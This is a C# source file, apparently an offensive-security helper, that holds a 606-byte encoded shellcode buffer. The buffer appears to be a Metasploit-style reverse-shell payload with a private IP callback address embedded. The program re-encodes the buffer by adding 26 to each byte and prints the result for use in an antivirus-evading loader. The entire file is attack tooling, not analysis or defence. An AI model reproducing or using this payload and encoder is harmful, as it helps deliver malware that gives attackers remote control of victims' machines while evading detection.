using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace csharpshellencrypt
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] buf = new byte[606] { 0xc0, 0x74, 0xbf, 0xd8, 0xcc, 0xd4, 0xf0, 0x3c, 0x3c, 0x3c, 0x7d, 0x6d, 0x7d, 0x6c, 0x6e, 0x74, 0x0d, 0xee, 0x6d, 0x59, 0x74, 0xb7, 0x6e, 0x5c, 0x6a, 0x74, 0xb7, 0x6e, 0x24, 0x74, 0xb7, 0x6e, 0x1c, 0x74, 0x33, 0x8b, 0x76, 0x76, 0x71, 0x0d, 0xf5, 0x74, 0xb7, 0x4e, 0x6c, 0x74, 0x0d, 0xfc, 0x90, 0x00, 0x5d, 0x40, 0x3e, 0x10, 0x1c, 0x7d, 0xfd, 0xf5, 0x31, 0x7d, 0x3d, 0xfd, 0xde, 0xd1, 0x6e, 0x74, 0xb7, 0x6e, 0x1c, 0x7d, 0x6d, 0xb7, 0x7e, 0x00, 0x74, 0x3d, 0xec, 0x5a, 0xbd, 0x44, 0x24, 0x37, 0x3e, 0x33, 0xb9, 0x4e, 0x3c, 0x3c, 0x3c, 0xb7, 0xbc, 0xb4, 0x3c, 0x3c, 0x3c, 0x74, 0xb9, 0xfc, 0x48, 0x5b, 0x74, 0x3d, 0xec, 0x78, 0xb7, 0x7c, 0x1c, 0x75, 0x3d, 0xec, 0xb7, 0x74, 0x24, 0x6c, 0xdf, 0x6a, 0x71, 0x0d, 0xf5, 0x74, 0xc3, 0xf5, 0x7d, 0xb7, 0x08, 0xb4, 0x74, 0x3d, 0xea, 0x74, 0x0d, 0xfc, 0x90, 0x7d, 0xfd, 0xf5, 0x31, 0x7d, 0x3d, 0xfd, 0x04, 0xdc, 0x49, 0xcd, 0x70, 0x3f, 0x70, 0x18, 0x34, 0x79, 0x05, 0xed, 0x49, 0xe4, 0x64, 0x78, 0xb7, 0x7c, 0x18, 0x75, 0x3d, 0xec, 0x5a, 0x7d, 0xb7, 0x30, 0x74, 0x78, 0xb7, 0x7c, 0x20, 0x75, 0x3d, 0xec, 0x7d, 0xb7, 0x38, 0xb4, 0x74, 0x3d, 0xec, 0x7d, 0x64, 0x7d, 0x64, 0x62, 0x65, 0x66, 0x7d, 0x64, 0x7d, 0x65, 0x7d, 0x66, 0x74, 0xbf, 0xd0, 0x1c, 0x7d, 0x6e, 0xc3, 0xdc, 0x64, 0x7d, 0x65, 0x66, 0x74, 0xb7, 0x2e, 0xd5, 0x77, 0xc3, 0xc3, 0xc3, 0x61, 0x74, 0x0d, 0xe7, 0x6f, 0x75, 0x82, 0x4b, 0x55, 0x52, 0x55, 0x52, 0x59, 0x48, 0x3c, 0x7d, 0x6a, 0x74, 0xb5, 0xdd, 0x75, 0xfb, 0xfe, 0x70, 0x4b, 0x1a, 0x3b, 0xc3, 0xe9, 0x6f, 0x6f, 0x74, 0xb5, 0xdd, 0x6f, 0x66, 0x71, 0x0d, 0xfc, 0x71, 0x0d, 0xf5, 0x6f, 0x6f, 0x75, 0x86, 0x06, 0x6a, 0x45, 0x9b, 0x3c, 0x3c, 0x3c, 0x3c, 0xc3, 0xe9, 0xd4, 0x2c, 0x3c, 0x3c, 0x3c, 0x0d, 0x05, 0x0e, 0x12, 0x0d, 0x0a, 0x04, 0x12, 0x0e, 0x0e, 0x0f, 0x12, 0x0d, 0x0f, 0x0b, 0x3c, 0x66, 0x74, 0xb5, 0xfd, 0x75, 0xfb, 0xfc, 0x87, 0x3d, 0x3c, 0x3c, 0x71, 0x0d, 0xf5, 0x6f, 0x6f, 0x56, 0x3f, 0x6f, 0x75, 0x86, 0x6b, 0xb5, 0xa3, 0xfa, 0x3c, 0x3c, 0x3c, 0x3c, 0xc3, 0xe9, 0xd4, 0x0e, 0x3c, 0x3c, 0x3c, 0x13, 0x7f, 0x05, 0x7b, 0x54, 0x48, 0x4c, 0x76, 0x09, 0x7f, 0x52, 0x75, 0x0a, 0x4d, 0x78, 0x49, 0x4d, 0x6b, 0x6a, 0x4f, 0x7a, 0x55, 0x6d, 0x73, 0x51, 0x51, 0x4e, 0x55, 0x5f, 0x44, 0x11, 0x69, 0x56, 0x05, 0x53, 0x71, 0x6e, 0x55, 0x7d, 0x7f, 0x55, 0x6e, 0x78, 0x6e, 0x4d, 0x65, 0x72, 0x05, 0x7e, 0x3c, 0x74, 0xb5, 0xfd, 0x6f, 0x66, 0x7d, 0x64, 0x71, 0x0d, 0xf5, 0x6f, 0x74, 0x84, 0x3c, 0x0e, 0x94, 0xb8, 0x3c, 0x3c, 0x3c, 0x3c, 0x6c, 0x6f, 0x6f, 0x75, 0xfb, 0xfe, 0xd7, 0x69, 0x12, 0x07, 0xc3, 0xe9, 0x74, 0xb5, 0xfa, 0x56, 0x36, 0x63, 0x74, 0xb5, 0xcd, 0x56, 0x23, 0x66, 0x6e, 0x54, 0xbc, 0x0f, 0x3c, 0x3c, 0x75, 0xb5, 0xdc, 0x56, 0x38, 0x7d, 0x65, 0x75, 0x86, 0x49, 0x7a, 0xa2, 0xba, 0x3c, 0x3c, 0x3c, 0x3c, 0xc3, 0xe9, 0x71, 0x0d, 0xfc, 0x6f, 0x66, 0x74, 0xb5, 0xcd, 0x71, 0x0d, 0xf5, 0x71, 0x0d, 0xf5, 0x6f, 0x6f, 0x75, 0xfb, 0xfe, 0x11, 0x3a, 0x24, 0x47, 0xc3, 0xe9, 0xb9, 0xfc, 0x49, 0x23, 0x74, 0xfb, 0xfd, 0xb4, 0x2f, 0x3c, 0x3c, 0x75, 0x86, 0x78, 0xcc, 0x09, 0xdc, 0x3c, 0x3c, 0x3c, 0x3c, 0xc3, 0xe9, 0x74, 0xc3, 0xf3, 0x48, 0x3e, 0xd7, 0x96, 0xd4, 0x69, 0x3c, 0x3c, 0x3c, 0x6f, 0x65, 0x56, 0x7c, 0x66, 0x75, 0xb5, 0xed, 0xfd, 0xde, 0x2c, 0x75, 0xfb, 0xfc, 0x3c, 0x2c, 0x3c, 0x3c, 0x75, 0x86, 0x64, 0x98, 0x6f, 0xd9, 0x3c, 0x3c, 0x3c, 0x3c, 0xc3, 0xe9, 0x74, 0xaf, 0x6f, 0x6f, 0x74, 0xb5, 0xdb, 0x74, 0xb5, 0xcd, 0x74, 0xb5, 0xe6, 0x75, 0xfb, 0xfc, 0x3c, 0x1c, 0x3c, 0x3c, 0x75, 0xb5, 0xc5, 0x75, 0x86, 0x2e, 0xaa, 0xb5, 0xde, 0x3c, 0x3c, 0x3c, 0x3c, 0xc3, 0xe9, 0x74, 0xbf, 0xf8, 0x1c, 0xb9, 0xfc, 0x48, 0x8e, 0x5a, 0xb7, 0x3b, 0x74, 0x3d, 0xff, 0xb9, 0xfc, 0x49, 0xee, 0x64, 0xff, 0x64, 0x56, 0x3c, 0x65, 0x87, 0xdc, 0x21, 0x16, 0x36, 0x7d, 0xb5, 0xe6, 0xc3, 0xe9 };


            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 26) & 0xFF);
            }

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                hex.AppendFormat("0x{0:x2}, ", b);
            }

            Console.WriteLine("The payload is: " + hex.ToString());
        }
    }
}
